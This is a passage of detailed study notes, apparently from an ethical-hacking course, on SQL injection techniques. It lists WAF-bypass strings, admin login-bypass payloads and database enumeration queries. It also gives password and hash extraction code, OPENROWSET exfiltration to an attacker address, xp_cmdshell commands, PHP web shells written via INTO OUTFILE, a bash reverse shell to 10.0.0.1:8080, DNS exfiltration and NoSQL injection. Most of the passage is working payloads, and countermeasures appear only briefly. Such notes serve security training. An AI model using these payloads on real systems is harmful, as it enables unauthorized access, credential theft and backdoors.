					- Carriage Return and Line Feed (CRLF) are ASCII control characters:
						- Carriage Return (CR): ASCII code 13 (\r)
						- Line Feed (LF): ASCII code 10 (\n)
					- Different operating systems handle line endings differently:
						- Windows uses \r\n
						- Macintosh uses \r (older versions)
						- Unix/Linux uses \n
					- Attackers can use CRLF sequences to manipulate HTTP headers, break firewall rules, or inject malicious SQL queries.
					- For example, the following URL uses CRLF injection to bypass the WAF: http://www.certifiedhacker.com/info.php?id=1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--
					- By encoding newline characters (%0A for \n and %0D for \r), the attacker tricks the WAF into misinterpreting the request, allowing SQL injection to proceed undetected.
				- Integration Method:
					- The Integration Method combines multiple bypassing techniques to increase the likelihood of bypassing the firewall when a single technique is insufficient. Attackers may mix buffer overflow, SQL injection, CRLF injection, and encoding techniques to evade security measures.
					- For example, an attacker may use the following queries together: www.certifiedhacker.com/index.php?page_id=21+and+(select 1)=(Select 0xAA[..(add about 1200 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,5...
					- Another variation targeting information schema to extract database table names: ?id=10/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()--
					- Extracting column names from the INFORMATION_SCHEMA: ?id=766+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=0x5573657273--
					- By strategically combining these techniques, attackers can increase their chances of successfully bypassing firewalls and executing SQL injection attacks.
			- Bypassing WAF Using JSON-Based SQL Injection Attack:
				- Attackers often manipulate JSON input to execute arbitrary SQL commands within a database. This is possible when a vulnerable web application accepts JSON content via a POST request without proper validation or sanitization.
				- Typically, web application firewalls (WAFs) detect special characters such as =, <, >, etc. To bypass these protections, attackers can use JSON operators in input fields instead. For example: {"key": "value"} ? "key"
				- By exploiting such vulnerabilities, attackers can execute arbitrary SQL queries through input fields and gain unauthorized access to user accounts, including administrator accounts, using an existing username.
				- Example Attack Scenario:
					- Consider the following JSON payload submitted to a vulnerable web application: {"user": "<username>' --", "pass": "irrelevant"}
					- If the server constructs an SQL query without proper validation, it may result in the following: SELECT * FROM users WHERE username = '<username>' --' AND password = 'irrelevant';
					- In this case, the -- (SQL comment operator) causes the rest of the query, including the password check, to be ignored. As a result, the attacker can log in as any user without needing a valid password.
			- SQL Injection to Insert a New User and Update Password:
				- Inserting a New User Using SQL Injection:
					- If an attacker gains knowledge of the structure of the Users table in a database, they can attempt to insert new user details into the table. Once successful, the attacker can use the newly created credentials to log into the web application.
					- For example:
						- An attacker may exploit the following query: SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
						- By injecting an INSERT statement into the query, they can add a new user:
							SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
							INSERT INTO Users (Email_ID, User_Name, Password)
							VALUES ('Clark@mymail.com', 'Clark', 'MyPassword'); --';
					- Note: This type of attack is possible only if the attacker has INSERT permissions on the Users table. Additionally, if the Users table has constraints or dependencies, inserting a new user may not be feasible.
				- Updating a Password Using SQL Injection:
					- Many web applications require a username and password for authentication. To assist users who forget their passwords, developers often implement a Forgot Password feature that sends a reset link or a new password to the user’s registered email address.
					- An attacker can exploit this feature by injecting malicious SQL code to update a user’s email address with the attacker’s own email. If successful, the application will send the password reset link or new credentials to the attacker's email, allowing them to gain unauthorized access.
					- For example:
						- If an attacker discovers that a user with the email "Alice@xyz.com" exists, they can update the email to their own: SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
						- By injecting an UPDATE statement, they modify the user’s email address:
							SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
							UPDATE Users SET Email_ID = 'Clark@mymail.com' WHERE Email_ID = 'Alice@xyz.com';
						- As a result, the Users table now reflects the attacker’s email instead of Alice’s.
						- Now, the attacker visits the web application's login page, clicks on the "Forgot Password?" link, and receives the reset instructions at their email. They then reset Alice’s password, log in using the new credentials, and perform malicious activities on her behalf.
		- Advanced SQL Injection:
			- An attacker does not stop at merely compromising an application’s data. They may escalate the SQL injection attack to compromise the underlying operating system (OS) and network. Using the compromised application, the attacker can issue commands to the underlying OS, take control of the target machine, and use it as a staging post to attack the rest of the network.
			- The attacker may interact with the OS to extract system details, obtain application passwords, execute commands, access system files, and more. Additionally, they can further compromise the entire target network by installing Trojans and planting keyloggers.
			- Database, Table, and Column Enumeration:
				- Attackers use various SQL queries to enumerate databases, table names, and columns. The information obtained through enumeration can be leveraged to:
					Extract sensitive data from the database.
					Modify data (insert, update, delete).
					Execute admin-level operations.
					Retrieve the contents of files stored in the DBMS file system.
				- The following techniques are commonly used by attackers for enumeration:
					- Identifying User-Level Privileges:
						- Attackers exploit built-in SQL scalar functions available in most SQL implementations to determine user privileges. Examples include:
							SELECT user, current_user, session_user, system_user;
							' and 1 in (select user) --';
							IF user = 'dbo' WAITFOR DELAY '0:0:5' --';
							UNION SELECT IF(user() LIKE 'root@%', BENCHMARK(50000, SHA1('test')), 'false');
					- Identifying Database Administrators:
						- Default administrator accounts in various databases include sa, system, sys, dba, admin, root, and others. The dbo (Database Owner) account has implicit permissions to perform all activities within the database. Any object created by a member of the sysadmin fixed server role is automatically assigned to dbo.
					- Discovering Database Structure:
						- Attackers use the following SQL queries to determine database structures:
						- Identify table and column names: ' GROUP BY columnname HAVING 1=1 --
						- Discover column data types: ' UNION SELECT SUM(columnname) FROM tablename --
						- Enumerate user-defined tables: ' AND 1 IN (SELECT MIN(name) FROM sysobjects WHERE xtype = 'U' AND name > '.') --
					- Column Enumeration in Different Databases:
						- Microsoft SQL Server (MSSQL):
							SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename');
							EXEC sp_columns tablename;
						- MySQL:
							SHOW COLUMNS FROM tablename;
						- Oracle:
							SELECT * FROM all_tab_columns WHERE table_name = 'tablename';
						- IBM DB2:
							SELECT * FROM syscat.columns WHERE tabname = 'tablename';
						- PostgreSQL:
							SELECT attnum, attname
							FROM pg_class, pg_attribute
							WHERE relname = 'tablename'
							AND pg_class.oid = attrelid
							AND attnum > 0;
			- Advanced Enumeration:
				- Attackers use advanced enumeration techniques to gather system-level and network-level information. The data collected in the previous stage can be leveraged to gain unauthorized access. For instance, an attacker can crack passwords using various tools such as L0phtCrack, John the Ripper, and others. Additionally, attackers exploit buffer overflow vulnerabilities to assess weaknesses in a system or network. The following database objects are commonly used for enumeration:
				- Examples:
					- Tables and Columns Enumeration in a Single Query:
						' UNION SELECT 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name,
						1, 1, '1', 1, 1, 1, 1, 1 
						FROM sys.objects, sys.columns, sys.types
						WHERE sys.objects.xtype = 'U'
						AND sys.objects.id = sys.columns.id
						AND sys.columns.xtype = sys.types.xtype --
					- Database Enumeration:
						- Listing Different Databases on a Server: ' AND 1 IN (SELECT MIN(name) FROM master.dbo.sys.databases WHERE name > '.') --
						- Finding the File Location of Databases: ' AND 1 IN (SELECT MIN(filename) FROM master.dbo.sys.databases WHERE filename > '.') -- 
				- Features of Different DBMS:
					- Once an attacker identifies the type of database used in an application during the information-gathering phase, they may then analyze the database’s specific features to tailor their attack strategy. Different database management systems (DBMS) vary in syntax and feature availability, including:
						- String concatenation methods
						- Comment styles
						- UNION query capabilities
						- Subqueries
						- Stored procedures
						- Information schema availability (or its equivalents)
					- Examples:
						- MySQL:
							SELECT * FROM table WHERE id = 1 UNION SELECT 1,2,3;
						- PostgreSQL
							SELECT * FROM table WHERE id = 1;
							SELECT 1,2,3;
						- Oracle:
							SELECT * FROM table WHERE id = 1 UNION SELECT NULL, NULL, NULL FROM sys.dual;
			- Creating Database Accounts:
				- The following are different ways to create database accounts in various DBMS:
				- Microsoft SQL Server:
					EXEC sp_addlogin 'victor', 'Pass123';
					EXEC sp_addsrvrolemember 'victor', 'sysadmin';
				- Oracle:
					CREATE USER victor IDENTIFIED BY Pass123
					TEMPORARY TABLESPACE temp
					DEFAULT TABLESPACE users;
					GRANT CONNECT TO victor;
					GRANT RESOURCE TO victor;
				- Microsoft Access:
					CREATE USER victor IDENTIFIED BY 'Pass123';
				- MySQL:
					CREATE USER 'victor'@'localhost' IDENTIFIED BY 'Pass123';
					GRANT ALL PRIVILEGES ON *.* TO 'victor'@'localhost' WITH GRANT OPTION;
			- Password Grabbing:
				- Password grabbing is one of the most serious consequences of an SQL injection attack. Attackers exploit SQL injection vulnerabilities to extract passwords from user-defined database tables. By crafting malicious SQL queries, they can retrieve sensitive credentials. Once obtained, these passwords can be modified, deleted, or used to gain unauthorized access. In some cases, attackers may escalate their privileges to an admin level using stolen credentials.
				- For example, an attacker may use the following SQL code to extract passwords:
					BEGIN
						DECLARE @var VARCHAR(8000);
						SET @var = ':';
						SELECT @var = @var + ' ' + login + '/' + password + ' ' FROM users WHERE login > @var;
						SELECT @var AS var INTO temp;
					END;
					--' AND 1 IN (SELECT var FROM temp) --' ; DROP TABLE temp --
			- Grabbing SQL Server Hashes:
				- Some databases store user IDs and passwords in the sys.syslogins table as hash values. Attackers attempt to extract plaintext credentials, password hashes, tokens, and other sensitive data from the database to further compromise the target network.
				- To extract this information, attackers execute a sequence of SQL queries against the target database, as demonstrated below:
				- Example 1:
					- The following SQL query extracts password hashes: SELECT password FROM sys.syslogins;
					- Next, the hashes are converted to hexadecimal format:
						BEGIN
							DECLARE @charvalue VARCHAR(8000) = '0x',
									@i INT = 1,
									@length INT = DATALENGTH(@binvalue),
									@hexstring VARCHAR(16) = '0123456789ABCDEF';

							WHILE (@i <= @length)
							BEGIN
								DECLARE @tempint INT,
										@firstint INT,
										@secondint INT;

								SELECT @tempint = CONVERT(INT, SUBSTRING(@binvalue, @i, 1));
								SELECT @firstint = FLOOR(@tempint / 16);
								SELECT @secondint = @tempint - (@firstint * 16);

								SELECT @charvalue = @charvalue +
													SUBSTRING(@hexstring, @firstint + 1, 1) +
													SUBSTRING(@hexstring, @secondint + 1, 1);

								SELECT @i = @i + 1;
							END;
						END;
					- Finally, attackers iterate through all extracted password hashes.
				- Example 2:
					- The following SQL query retrieves user names along with password hashes: SELECT name, password FROM sys.syslogins;
					- To display hashes through an error message, attackers may convert them into hexadecimal format and concatenate the results.
					- Note: Extracting password hashes generally requires DBA (Database Administrator) privileges. However, even with lower privileges, attackers can still extract usernames and attempt brute-force attacks to crack the passwords.
					- SQL Server Hash Sample: 0x010034767D5C0CFA5FDCA28C4A56085E65E882E71CB0ED2503412FD54D6119FFF04129A1D72E7C3194F7284A7F3A
					- Extracting Hashes Through Error Messages:
						- Attackers may also attempt to extract hashes by triggering error messages using SQL injection techniques:
							' AND 1 IN (SELECT x FROM temp) --
							' AND 1 IN (SELECT SUBSTRING(x, 256, 256) FROM temp) --
							' AND 1 IN (SELECT SUBSTRING(x, 512, 256) FROM temp) --
							DROP TABLE temp --
			- Transferring a Database to an Attacker's Machine:
				- An attacker can link a target SQL Server database to their own machine, allowing them to retrieve data from the compromised database. This is accomplished using OPENROWSET. Once the database structure is replicated, the data transfer begins. The attacker establishes a connection to a remote machine on port 80 to exfiltrate the data.
				- For example, an attacker may inject the following SQL query sequence to transfer the database:
					'; INSERT INTO OPENROWSET('SQLoledb',
						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
						'SELECT * FROM mydatabase..hacked_sysdatabases')
						SELECT * FROM sys.sysdatabases --';

					INSERT INTO OPENROWSET('SQLoledb',
						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
						'SELECT * FROM mydatabase..hacked_sysobjects')
						SELECT * FROM sys.sysobjects --';

					INSERT INTO OPENROWSET('SQLoledb',
						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
						'SELECT * FROM mydatabase..hacked_syscolumns')
						SELECT * FROM sys.syscolumns --';

					INSERT INTO OPENROWSET('SQLoledb',
						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
						'SELECT * FROM mydatabase..table1')
						SELECT * FROM database..table1 --';

					INSERT INTO OPENROWSET('SQLoledb',
						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
						'SELECT * FROM mydatabase..table2')
						SELECT * FROM database..table2 --';
			- Interacting with the Operating System:
				- Attackers use various DBMS queries to interact with a target operating system (OS). There are two primary ways to achieve this:
				- Reading and writing system files from disk: An attacker can read arbitrary files stored on the target system running the DBMS, allowing them to steal important documents, configurations, or binary files. They can also extract credentials from system files to escalate privileges and launch further attacks.
				- Executing commands via a remote shell: An attacker can exploit a Windows access token to escalate privileges on the target system, execute malicious commands, and carry out further attacks.
				- Example Queries for OS Interaction:
					- MSSQL OS Interaction:
						'; EXEC master..xp_cmdshell 'ipconfig > test.txt' --';
						CREATE TABLE tmp (txt VARCHAR(8000));
						BULK INSERT tmp FROM 'test.txt' --';
						BEGIN
							DECLARE @data VARCHAR(8000);
							SET @data = '| ';
							SELECT @data = @data + txt + ' | ' FROM tmp WHERE txt < @data;
							SELECT @data AS x INTO temp;
						END --' AND 1 IN (SELECT SUBSTRING(x,1,256) FROM temp) --';
						DECLARE @var SYSNAME;
						SET @var = 'del test.txt';
						EXEC master..xp_cmdshell @var;
						DROP TABLE temp;
						DROP TABLE tmp --
					- MySQL OS Interaction:
						CREATE FUNCTION sys_exec RETURNS INT SONAME 'libudffmwgj.dll';
						CREATE FUNCTION sys_eval RETURNS STRING SONAME 'libudffmwgj.dll';
				- Note: The ability to execute these queries depends on the database’s privileges and permissions. Many modern database systems implement security restrictions to mitigate such attacks.
			- Interacting with the File System:
				- Attackers exploit MySQL’s ability to read text files through the database to obtain password files and store query results in a text file.
				- The following MySQL functions are commonly used by attackers to interact with the file system:
				- LOAD_FILE():
					- The LOAD_FILE() function in MySQL reads and returns the contents of a file located on the MySQL server. Attackers can use this function to extract sensitive files, such as password files.
					- For example, the following query retrieves the system's password file: NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
					- If successful, this injection will display the contents of the /etc/passwd file.
				- INTO OUTFILE():
					- The INTO OUTFILE function allows MySQL to write the output of a query into a file. Attackers can exploit this function to create backdoor scripts.
					- For example, the following query writes a malicious PHP web shell to the server:
						NULL UNION ALL SELECT NULL, NULL, NULL, NULL,
						'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
					- If successful, this will allow the attacker to execute system commands via the $_GET global variable.
					- An example of using wget to retrieve a file through the malicious shell is: http://www.certifiedhacker.com/shell.php?command=wget
				- Note: The success of these attacks depends on MySQL’s file privileges and system configurations. Modern database security measures typically restrict these functions to prevent exploitation.
			- Network Reconnaissance Using SQL Injection:
				- Network reconnaissance is the process of identifying potential vulnerabilities in a computer network. However, it is also a major type of network attack. While network reconnaissance can be mitigated to some extent, it cannot be entirely eliminated. Attackers often use network mapping tools such as Nmap and Network Topology Mapper to identify network vulnerabilities.
				- Steps for Assessing Network Connectivity:
					- Retrieve server name and configuration using the following SQL injection techniques:
						' AND 1 IN (SELECT @@servername) --
						' AND 1 IN (SELECT srvname FROM sys.sysservers) --
					- Use utilities such as NetBIOS, ARP, Local Open Ports, nslookup, ping, FTP, TFTP, SMB, and traceroute to assess network connectivity.
					- Test for the presence of firewalls and proxies.
				- Performing Network Reconnaissance Using xp_cmdshell:
					- You can execute the following commands using the xp_cmdshell function in SQL Server:
						EXEC xp_cmdshell 'ipconfig /all'
						EXEC xp_cmdshell 'tracert MyIP'
						EXEC xp_cmdshell 'arp -a'
						EXEC xp_cmdshell 'nbtstat -c'
						EXEC xp_cmdshell 'netstat -ano'
						EXEC xp_cmdshell 'route print'
				- Code to Gather IP Information Through Reverse Lookups:
					- Reverse DNS Lookup: '; EXEC master..xp_cmdshell 'nslookup a.com MyIP' --
					- Reverse Ping: '; EXEC master..xp_cmdshell 'ping 10.0.0.75' --  
					- Using OPENROWSET to Extract Data:
						'; SELECT * FROM OPENROWSET(
							'SQLoledb',
							'UID=sa; PWD=Pass123; Network=DBMSSOCN; Address=10.0.0.75,80;',
							'SELECT * FROM table'
						)
			- Network Reconnaissance Full Query:
				- The following queries can be used to perform network reconnaissance:
				- Execute multiple network commands and store the output in a text file:
					'; DECLARE @var VARCHAR(256);
					SET @var = 'del test.txt && arp -a >> test.txt && ipconfig /all >> test.txt &&
								nbtstat -c >> test.txt && netstat -ano >> test.txt &&
								route print >> test.txt && tracert -w 10 -h 10 google.com >> test.txt';
					EXEC master..xp_cmdshell @var --
				- Create a temporary table and insert data from the generated text file:
					'; CREATE TABLE tmp (txt VARCHAR(8000));
					BULK INSERT tmp FROM 'test.txt' --
				- Extract and concatenate data from the temporary table:
					'; BEGIN
						DECLARE @data VARCHAR(8000);
						SET @data = ': ';
						SELECT @data = @data + txt + ' | ' FROM tmp WHERE txt < @data;
						SELECT @data AS x INTO temp;
					END --
				- Retrieve extracted data from the temporary table:
					' AND 1 IN (SELECT SUBSTRING(x, 1, 255) FROM temp) --
				- Clean up temporary files and tables:
					'; DECLARE @var SYSNAME;
					SET @var = 'del test.txt';
					EXEC master..xp_cmdshell @var;
					DROP TABLE temp;
					DROP TABLE tmp --
				- Note:	By default, Microsoft SQL Server disables xp_cmdshell due to security risks. To enable it, execute the following commands:
					EXEC sp_configure 'xp_cmdshell', 1;
					GO
					RECONFIGURE;
					GO
			- Finding and Bypassing the Admin Panel of a Website:
				- Attackers attempt to locate the admin panel of a website using simple Google dorks and bypass administrator authentication through SQL injection attacks. Typically, an attacker uses Google dorks to find the URL of an admin panel.
				- For example, the attacker may use the following dorks to identify the admin panel of a website:
					- inurl:"adminlogin.aspx"
					- inurl:"admin/index.php"
					- inurl:"administrator.php"
					- inurl:"administrator.asp"
					- inurl:"/admin/"
					- inurl:"login.asp"
					- inurl:"/admin/login.php"
					- inurl:"login.aspx"
					- inurl:"login.php"
					- inurl:"admin/index.html"
					- inurl:"adminlogin.php"
				- Using these dorks, an attacker may construct URLs to access the admin login page, such as:
					- http://www.certifiedhacker.com/admin.php
					- http://www.certifiedhacker.com/admin/
					- http://www.certifiedhacker.com/admin.html
					- http://www.certifiedhacker.com:2082/
				- Once the attacker gains access to the admin login page, they attempt to obtain the admin username and password by injecting malicious SQL queries. For example:
					- Username: 1'or'1'='1
					- Password: 1'or'1'='1
				- Some common SQL queries used to bypass admin authentication include:
					- ' or 1=1 --
					- 1'or'1'='1
					- admin'--
					- '' or 0=0 --
					- or 0=0 --
					- ' or 0=0 #
					- '' or 0=0 #
					- or 0=0 #
					- ' or 'x'='x
					- '' or "x"="x"
					- ') or ('x'='x
					- ' or 1=1--
					- '' or 1=1--
					- or 1=1--
				- After successfully bypassing admin authentication, the attacker gains full access to the admin panel, allowing them to carry out malicious activities such as installing backdoors for further exploitation.
			- PL/SQL Exploitation:
				- PL/SQL, similar to stored procedures, is vulnerable to various SQL injection attacks. PL/SQL code shares the same vulnerabilities as dynamic queries that incorporate user input at runtime. Some techniques used by attackers to exploit SQL injection vulnerabilities in PL/SQL blocks are discussed below.
				- Example: SQL Injection in PL/SQL
					- Consider a database containing the User_Details table with the following attributes:
						- UserName: VARCHAR2
						- Password: VARCHAR2
					- A PL/SQL procedure is used to validate a user's password while retrieving details from the table. However, this procedure is vulnerable to SQL injection attacks:
						CREATE OR REPLACE PROCEDURE Validate_UserPassword(
							N_UserName IN VARCHAR2,
							N_Password IN VARCHAR2
						) AS
							CUR SYS_REFCURSOR;
							FLAG NUMBER;
						BEGIN
							OPEN CUR FOR 'SELECT 1 FROM User_Details WHERE UserName = ''' ||
								N_UserName || '''' || ' AND Password = ''' || N_Password || '''';
							FETCH CUR INTO FLAG;
							IF CUR%NOTFOUND THEN
								RAISE_APPLICATION_ERROR(-20343, 'Password Incorrect');
							END IF;
							CLOSE CUR;
						END;
					- To execute this procedure, use the following command: EXEC Validate_UserPassword('Bob', '@Bob123');
				- Exploitation Techniques:
					- This PL/SQL procedure can be exploited in two different ways:
					- Exploiting Quotes:
						- An attacker can inject malicious input into the password field. For example: EXEC Validate_UserPassword('Bob', 'x'' OR ''1''=''1');
						- This modifies the SQL query inside the procedure: SELECT 1 FROM User_Details WHERE UserName = 'Bob' AND Password = 'x' OR '1'='1';
						- Since '1'='1' is always true, the query returns a row, allowing unauthorized access.
					- Exploitation by Truncation:
						- Attackers can also use inline comments (--) to bypass authentication. For example: EXEC Validate_UserPassword('Bob''--', '');
						- This modifies the SQL query inside the procedure: SELECT 1 FROM User_Details WHERE UserName = 'Bob'-- AND Password='';
						- The -- comment disables the password check, allowing an attacker to log in without a valid password.
				- Countermeasures to Prevent SQL Injection:
					- Minimize user inputs in dynamic SQL.
					- Validate and sanitize user inputs before including them in dynamic SQL statements.
					- Use the DBMS_ASSERT package provided by Oracle to validate user inputs.
					- Use bind parameters in dynamic SQL to prevent direct concatenation of user inputs.
					- Avoid single quotes and use secure string parameters by employing double quotes.
					- Apply the principle of least privilege to restrict the database account executing PL/SQL.
					- Regularly review and test PL/SQL code for vulnerabilities, particularly SQL injections.
					- Customize error handling to prevent database metadata leakage through error messages.
			- Creating Server Backdoors Using SQL Injection:
				- The following are different methods attackers use to create backdoors:
				- Getting OS Shell:
					- Attackers exploit SQL server functions such as xp_cmdshell to execute arbitrary commands. Each DBMS software has its own naming conventions for such functions. Another technique involves using the SELECT ... INTO OUTFILE feature in MySQL to write arbitrary files with database user permissions. This allows attackers to overwrite critical system files, including shell scripts executed at system startup. Backdoors can also be established by defining and executing stored procedures within the database.
					- Using OUTFILE:
						- If an attacker gains access to the web server, they can use the following MySQL query to create a PHP shell on the server: SELECT '<?php exec($_GET["cmd"]); ?>' FROM usertable INTO OUTFILE '/var/www/html/shell.php';
					- Finding Directory Structure:
						- To determine the location of the database on the web server, an attacker can execute the following SQL injection query: SELECT @@datadir;
						- By analyzing the directory structure, an attacker can identify where to place a shell on the web server.
					- Using Built-in DBMS Functions:
						- MSSQL includes built-in functions such as xp_cmdshell, which can be used to execute OS commands at runtime. The following example demonstrates how an attacker could create an interactive shell that listens on IP 10.0.0.1 and port 8080: EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1';
				- Creating a Database Backdoor:
					- Attackers can use triggers to create database backdoors. A database trigger is a stored procedure that is automatically executed in response to specific database events.
					- For example, consider an online shopping website that stores product details in a database table called ITEMS. An attacker may inject a malicious trigger into this table so that whenever an INSERT query is executed, the trigger sets the item's price to 0. This would allow customers to purchase items without paying.
					- The malicious Oracle trigger code is as follows:
						CREATE OR REPLACE TRIGGER SET_PRICE  
						AFTER INSERT OR UPDATE ON ITEMS  
						FOR EACH ROW  
						BEGIN  
						UPDATE ITEMS SET Price = 0;  
						END;
					- The attacker needs to inject and execute this trigger on the web server to establish the backdoor.
			- HTTP Header-Based SQL Injection:
				- Attackers can exploit HTTP headers to inject SQL queries into a vulnerable server. This vulnerability typically arises when proper input sanitization is not performed. Various HTTP header fields can be manipulated to inject malicious SQL queries.
				- HTTP Header Fields:
					- HTTP header fields are components of the HTTP request and response messages. These fields define the operational parameters of an HTTP transaction between a web server and a browser. Some basic request HTTP header fields include:
						GET / HTTP/1.1
						Connection: Keep-Alive
						Keep-Alive: Timeout
						Accept: */*
						Host: [host]:[port]
						Accept-Language: [language] [q=qvalue]
						Accept-Encoding: [encoding types]
						User-Agent: <product><product-version> <comment>
						Cookie: name=value
					- HTTP cookies are commonly used as potential attack vectors since they are stored in databases for session identification.
				- X-Forwarded-For:
					- The X-Forwarded-For (XFF) header is an HTTP header field that identifies the IP address of a client connecting through an HTTP proxy. Attackers can manipulate this field to bypass authentication mechanisms.
					- Consider the following vulnerable SQL query in a form submission:
						$req = mysql_query("SELECT username, pwd FROM admin_table
						WHERE username='" . sanitize($_POST['user']) . "'
						AND pwd='" . md5($_POST['password']) . "'
						AND ipaddr='" . ip_address() . "'");
					- In this example, the sanitize() function correctly validates the username and password inputs:
						function sanitize($params) { 
							if (is_numeric($params)) { 
								return $params; 
							} else { 
								return mysql_real_escape_string($params); 
							}
						}
					- However, the ip_address() function retrieves the client’s IP address without proper sanitization:
						function ip_address() {
							if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
								$ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];
							} else {
								$ip_addr = $_SERVER["REMOTE_ADDR"];
							}

							if (preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#", $ip_addr)) {
								return $ip_addr;
							} else {
								return $_SERVER["REMOTE_ADDR"];
							}
						}
					- In this function, the IP address is retrieved from the X-Forwarded-For header but is not sufficiently sanitized, making it vulnerable to SQL injection.
					- For example, an attacker could modify the X-Forwarded-For header to inject a malicious SQL query:
						GET /index.php HTTP/1.1
						Host: [host]
						X-Forwarded-For: 10.10.10.11' OR 1=1#
				- User-Agent:
					- The User-Agent header contains information about the client making the request. Attackers can inject SQL code into this field.
					- Format: User-Agent: <product> | <comment>
					- Example: User-Agent: Mozilla/68.0.2 (compatible; MSIE 5.01; Windows 10)
					- An attacker could modify this field as follows:
						GET /index.php HTTP/1.1
						Host: [host]
						User-Agent: aaa' OR 1/*
				- Referer:
					- The Referer header indicates the URI of the referring document. If an application stores this input in a database without sanitization, it becomes vulnerable to SQL injection.
					- Example of a malicious request:
						GET /index.php HTTP/1.1
						Host: [host]
						User-Agent: aaa' OR 1/*
						Referer: http://www.hackerswebsite.com
			- DNS Exfiltration Using SQL Injection:
				- Attackers use DNS exfiltration to extract data, such as password hashes, through DNS requests. These DNS requests, sent by the attacker, can potentially pass through the database server to an arbitrary host. Even if a firewall prevents the database server from directly communicating with the Internet, it may still allow DNS requests to pass through an internal DNS server, as these requests originate from the server itself.
				- Attackers embed the output of a malicious SQL query within a DNS request and capture the response sent by the server. For example, an attacker may attempt DNS exfiltration using SQL injection as follows: do_dns_lookup((SELECT TOP 1 password FROM users) + '.certifiedhacker.com');
				- In this scenario, the attacker uses the SELECT statement to extract a password hash and appends a domain name (certifiedhacker.com) to the result. The attacker then performs a DNS lookup for a fabricated hostname and uses a packet sniffer to capture packets from the name server of the target domain. This allows the attacker to retrieve the password hash from the DNS record.
				- For instance, the following DNS request demonstrates how the extracted password hash is included in the query: appserver.example.com.5678 > ns.certifiedhacker.com.53 A? 0x4a6f686e.certifiedhacker.com
				- In this example, the string "0x4a6f686e" represents the password hash extracted using the SELECT statement. If the attacker operates a DNS server at appserver.example.com, they can perform a DNS lookup on hostname.appserver.example.com. This ensures that their server receives the query, allowing them to retrieve the leaked data from the DNS request.
				- The following code illustrates DNS exfiltration via SQL injection on an MS SQL Server:
					DECLARE @hostname VARCHAR(1024);
					SELECT @hostname = (SELECT HOST_NAME()) + '.appserver.example.com';
					EXEC('master.dbo.xp_dirtree "\\' + @hostname + '\c$"');
			- MongoDB Injection/NoSQL Injection Attack:
				- MongoDB is a NoSQL database, making it vulnerable to various NoSQL injection attacks. Web applications that use a MongoDB database may contain authentication vulnerabilities, allowing attackers to bypass authentication mechanisms. This can lead to data exfiltration and modification. Applications developed using PHP, JavaScript, Python, and Java may enable attackers to execute commands both in the database and the application.
				- Attackers leverage MongoDB operators such as $eq (equals), $ne (not equal to), $gt (greater than), $gte (greater than or equal to), and $regex to craft malicious queries that bypass authentication.
				- Example: NoSQL Injection in PHP
					- Consider the following PHP code used to authenticate user credentials in MongoDB:
						$user_name = $_POST['username'];
						$pwd = $_POST['password'];

						$new_conn = new MongoDB\Client('mongodb://localhost:27017');
						if ($new_conn) {
							$mydb = $new_conn->mytest;
							$users = $mydb->users;
							$myquery = array(
								"user" => $user_name,
								"password" => $pwd
							);
							$myreq = $users->findOne($myquery);
						}
					- The above code retrieves the username and password from a POST request and attempts to authenticate the user. However, an attacker can exploit this with a NoSQL injection payload: username[$eq]=admin&pwd[$ne]=admin
					- If this query is executed in the database, the attacker can log in as an admin user.
				- JavaScript Injection in MongoDB:
					- Some PHP applications using MongoDB allow the $where query operation, which can be exploited for JavaScript injection. An attacker can input malicious JavaScript code to retrieve a list of users from the database.
					- For example, if the application uses the following query to check for a specific user: $myquery = array('$where' => 'this.username === \'' . $username . '\'');
					- This code compares the username field in the database. However, an attacker can inject an empty string to manipulate the query: '; return '' == '
					- Executing this script can cause the application to return a list of users. Additionally, if an attacker inputs while(true), it could trigger an infinite loop, potentially leading to a Denial-of-Service (DoS) attack.
			- SQL Injection Tools:
				- The previous topics discussed SQL injection attack techniques that an attacker can use to exploit a web application. Attackers utilize SQL injection tools to implement these techniques quickly and effectively at every stage of an attack. These tools also enable attackers to enumerate users, databases, roles, columns, tables, and more.
				- sqlmap (sqlmap.org):
					- sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities, allowing attackers to take control of database servers. It features a powerful detection engine, numerous advanced functionalities for penetration testers, and a wide range of options for database fingerprinting, extracting data, accessing the underlying file system, and executing OS-level commands via out-of-band connections. Attackers can use sqlmap to perform SQL injection on target websites using various techniques, including Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band injection.
					- Key Features of sqlmap:
						- Full support for six SQL injection techniques: Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band injection.
						- Ability to connect directly to a database without requiring an SQL injection vulnerability by providing DBMS credentials, IP address, port, and database name.
						- Support for enumerating users, password hashes, privileges, roles, databases, tables, and columns.
						- Automatic detection of password hash formats and support for dictionary-based attacks to crack them.
						- Ability to dump entire database tables, extract specific columns, or retrieve a selected range of entries.
						- Support for searching specific database names, tables across all databases, or columns within all database tables.
						- Capability to establish an out-of-band, stateful TCP connection between the attacker’s machine and the database server’s underlying operating system.
				- Mole (sourceforge.net):
